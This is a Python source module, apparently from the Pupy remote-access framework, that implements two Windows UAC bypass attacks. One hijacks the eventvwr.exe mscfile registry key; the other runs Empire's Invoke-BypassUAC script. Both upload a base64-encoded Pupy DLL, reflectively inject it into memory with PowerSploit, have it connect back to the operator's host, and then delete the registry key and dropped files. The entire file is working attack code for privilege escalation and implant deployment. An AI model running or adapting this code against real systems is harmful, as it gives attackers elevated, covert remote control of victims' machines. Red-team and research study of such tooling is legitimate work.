# -*- coding: UTF8 -*-
#by @bobsesq

import os, logging
import platform
import pupygen
from rpyc.utils.classic import upload
import base64
from tempfile import gettempdir, _get_candidate_names
import subprocess
from modules.lib.windows.powershell_upload import execute_powershell_script
import re, time

def bypassuac_through_EventVwrBypass(module, rootPupyPath):
	'''
	Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
	'''
	#Constants
	mscCmdPath = "Software\Classes\mscfile\shell\open\command"
	#Define Remote paths
	remoteTempFolder=module.client.conn.modules['os.path'].expandvars("%TEMP%")
	invokeReflectivePEInjectionRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
	mainPowershellScriptRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
	pupyDLLRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
	eventvwrPath = module.client.conn.modules['os.path'].join(module.client.conn.modules['os'].environ['WINDIR'],'System32','eventvwr.exe')
	#Define Local paths
	pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
	mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
	invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
	#Variables
	HKCU = module.client.conn.modules['_winreg'].HKEY_CURRENT_USER
	cmd = "PowerShell.exe -ExecutionPolicy Bypass -File {0}".format(mainPowershellScriptRemotePath)
	#main
	uploadPupyDLL(module, pupyDLLLocalPath, pupyDLLRemotePath)
	uploadPowershellScripts(module, mainPowerShellScriptPrivilegedLocalPath, mainPowershellScriptRemotePath, invokeReflectivePEInjectionLocalPath, invokeReflectivePEInjectionRemotePath, pupyDLLRemotePath)
	try:
		key = module.client.conn.modules['_winreg'].OpenKey(HKCU, mscCmdPath, module.client.conn.modules['_winreg'].KEY_SET_VALUE)
		logging.debug('The registry key {0} already exist in HKCU, altering...'.format(mscCmdPath))
	except:
		logging.debug("Adding the registry key {0} in HKCU".format(mscCmdPath))
		key = module.client.conn.modules['_winreg'].CreateKey(HKCU, mscCmdPath)
	registry_key = module.client.conn.modules['_winreg'].OpenKey(HKCU, mscCmdPath, 0, module.client.conn.modules['_winreg'].KEY_WRITE)
	module.client.conn.modules['_winreg'].SetValueEx(key, '', 0, module.client.conn.modules['_winreg'].REG_SZ, cmd)
	module.client.conn.modules['_winreg'].CloseKey(registry_key)
		
	logging.debug('Executing {0} through eventvwr.exe'.format(eventvwrPath))
	output = module.client.conn.modules.subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
	logging.debug("Output: {0}".format(repr(output)))
	logging.debug("Sleeping 5 secds...")
	time.sleep(5)
	logging.debug("Deleting registry key {0} from HKCU".format(mscCmdPath))
	module.client.conn.modules['_winreg'].DeleteKey(HKCU, mscCmdPath)
	#Clean
	deleteTHisRemoteFile(module, invokeReflectivePEInjectionRemotePath)
	deleteTHisRemoteFile(module, mainPowershellScriptRemotePath)
	deleteTHisRemoteFile(module, pupyDLLRemotePath)

def bypassuac_through_PowerSploitBypassUAC(module, rootPupyPath):
	'''
	Performs a bypass UAC attack by utilizing the powersloit UACBypass script (wind7 to 8.1)
	'''
	module.client.load_package("psutil")
	module.client.load_package("pupwinutils.processes")
	#Define Remote paths
	remoteTempFolder=module.client.conn.modules['os.path'].expandvars("%TEMP%")
	invokeReflectivePEInjectionRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
	invokeBypassUACRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
	mainPowershellScriptRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
	pupyDLLRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
	#Define Local paths
	pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
	mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
	invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
	invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
	invokeBypassUACLocalPath = os.path.join(rootPupyPath,"pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
	#Constants
	bypassUACcmd = "Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file {0} -Verbose'".format(mainPowershellScriptRemotePath) #{0}=mainPowerShellScriptPrivileged.ps1
	byPassUACSuccessString = "DLL injection complete!"
	
	uploadPowershellScripts(module, mainPowerShellScriptPrivilegedLocalPath, mainPowershellScriptRemotePath, invokeReflectivePEInjectionLocalPath, invokeReflectivePEInjectionRemotePath, pupyDLLRemotePath)

	uploadPupyDLL(module, pupyDLLLocalPath,pupyDLLRemotePath)
	
	content = re.sub("Write-Verbose ","Write-Output ", open(invokeBypassUACLocalPath, 'r').read(), flags=re.I)
	logging.info("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
 	output = execute_powershell_script(module, content, bypassUACcmd)
	logging.info("BypassUAC script output: %s\n"%(output))
	if byPassUACSuccessString in output:
		module.success("UAC bypassed")
	else:
		module.warning("Impossible to know what's happened remotely. You should active debug mode.")
	#Clean
	deleteTHisRemoteFile(module, invokeReflectivePEInjectionRemotePath)
	deleteTHisRemoteFile(module, mainPowershellScriptRemotePath)
	deleteTHisRemoteFile(module, invokeBypassUACRemotePath)
	deleteTHisRemoteFile(module, pupyDLLRemotePath)
	#...
	module.success("Waiting for a connection from the DLL (take few seconds)...")
	
def uploadPowershellScripts(module, mainPowerShellScriptPrivilegedLocalPath, mainPowershellScriptRemotePath, invokeReflectivePEInjectionLocalPath, invokeReflectivePEInjectionRemotePath, pupyDLLRemotePath):
	'''
	Upload main powershell script and invokeReflectivePEInjection script
	'''
	mainPowerShellScriptPrivileged = """
	cat {0} | Out-String  | iex
	cat {1} | Out-String  | iex
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
	""" #{0}=Invoke-ReflectivePEInjection.txt and {1}=dllFile.txt
	logging.info("Creating the Powershell script in %s locally"%(mainPowerShellScriptPrivilegedLocalPath))
	with open(mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
		w.write(mainPowerShellScriptPrivileged.format(invokeReflectivePEInjectionRemotePath, pupyDLLRemotePath))
	logging.info("Uploading powershell code for DLL injection in {0}".format(invokeReflectivePEInjectionRemotePath))
	upload(module.client.conn, invokeReflectivePEInjectionLocalPath, invokeReflectivePEInjectionRemotePath)
	logging.info("Uploading main powershell script executed by BypassUAC in {0}".format(mainPowerShellScriptPrivilegedLocalPath))
	upload(module.client.conn, mainPowerShellScriptPrivilegedLocalPath, mainPowershellScriptRemotePath)

def uploadPupyDLL(module, pupyDLLLocalPath, pupyDLLRemotePath):
	'''
	Returns True if no error. Otherwise returns False
	'''
	res=module.client.conn.modules['pupy'].get_connect_back_host()
	host, port = res.rsplit(':',1)
	logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
	logging.info("Looking for process architecture...")
	if module.client.conn.modules['pupwinutils.processes'].is_x64_architecture() == True:
		logging.info("Target achitecture is x64, using a x64 dll")
		dllbuff=pupygen.get_edit_pupyx64_dll(module.client.get_conf())
	elif module.client.conn.modules['pupwinutils.processes'].is_x86_architecture() == True:
		logging.info("Target achitecture is x86, using a x86 dll")
		dllbuff=pupygen.get_edit_pupyx86_dll(module.client.get_conf())
	else:
		module.error("Target architecture is unknown (!= x86 or x64), abording...")
		return False
	logging.info("Creating the pupy dll in %s locally"%(pupyDLLLocalPath))
	with open(pupyDLLLocalPath, 'w+') as w:
		w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
	logging.info("Uploading pupy dll in {0}".format(pupyDLLRemotePath))
	upload(module.client.conn, pupyDLLLocalPath, pupyDLLRemotePath)
	return True

def deleteTHisRemoteFile(module, remotePath):
	'''
	'''
	logging.debug("Deleting the remote file {0}".format(remotePath))
	try:
		module.client.conn.modules['os'].remove(remotePath)
	except Exception, e:
		logging.warning('Impossible to delete remote file {0}: {1}'.format(remotePath, repr(e)))
